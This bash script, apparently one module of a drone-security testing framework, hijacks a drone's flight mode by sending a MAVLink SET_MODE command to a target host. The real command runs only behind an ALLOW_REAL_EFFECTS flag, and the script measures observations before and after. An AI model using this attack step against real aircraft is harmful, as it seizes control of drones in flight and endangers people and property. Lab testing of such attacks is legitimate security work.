#!/usr/bin/env bash
# Force flight mode via MAVLink SET_MODE.
set -euo pipefail
BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
. "$BASE/00_env.sh"; . "$BASE/sh_core/lpc_bus.sh"; . "$BASE/sh_core/metrics.sh"

: "${MODE_NUM:=4}"  # Example: 4(LOITER) mapping depends on firmware
: "${DUR:=1}"

main(){
  log "[mavlink_mode_hijack] mode=$LPC_MODE mode_num=$MODE_NUM dur=$DUR"
  local before after; before=$(obs_snapshot "$DVD_C_GCS" "$DVD_TARGET_IF")
  if [ "${ALLOW_REAL_EFFECTS:-0}" -eq 1 ]; then
    python3 "$BASE/interface/mavlink_cmd.py" --host "$DVD_MAVLINK_HOST" --port "$DVD_MAVLINK_PORT" set-mode "$MODE_NUM" || true
    bus_emit "mavlink" "action=set_mode num=$MODE_NUM target=$DVD_MAVLINK_HOST:$DVD_MAVLINK_PORT"
  else
    bus_emit "mavlink" "action=set_mode_sim num=$MODE_NUM"
  fi
  sleep "$DUR"
  after=$(obs_snapshot "$DVD_C_GCS" "$DVD_TARGET_IF"); delta_emit "$before" "$after" "mavlink_obs"
}
main "$@"
